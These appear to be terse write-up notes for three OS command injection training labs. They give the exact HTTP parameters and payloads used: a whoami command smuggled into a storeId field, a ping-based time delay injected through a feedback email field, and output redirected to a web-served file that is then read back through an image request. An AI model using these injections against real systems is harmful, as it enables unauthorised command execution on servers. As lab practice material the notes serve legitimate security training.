
# Lab: OS command injection, simple case

Change the storeId to:
```
productId=1&storeId=2%26whoami%26
```


# Lab: Blind OS command injection with time delays
Add a ping dalay injection to the email parameter in order to execute linux shell command during the submit feedback

From:
```
csrf=rhjQbHdiNxnIt2k3noaWaGVhsmRC5eeS&name=asas&email=asas%40aas&subject=dsd&message=sdsdsd
```
To:
```
csrf=rhjQbHdiNxnIt2k3noaWaGVhsmRC5eeS&name=asas&email=asas%40aas$(ping+-c+10+127.0.0.1)&subject=dsd&message=sdsdsd
```

# Lab: Blind OS command injection with output redirection
Inject the write into the email
```
POST /feedback/submit HTTP/1.1
...
csrf=NgUfcXL1JL8wMtVIvLsEGjFwx3ApBMr5&name=asdf&email=asdff%40asdf$(whoami+>+/var/www/images/whoami.txt)&subject=afd&message=asdf
```
After that you should be able to intercept somme GET for real image in the site and change the path to your txt file to retreive it
```
GET /image?filename=whoami.txt HTTP/1.1
```

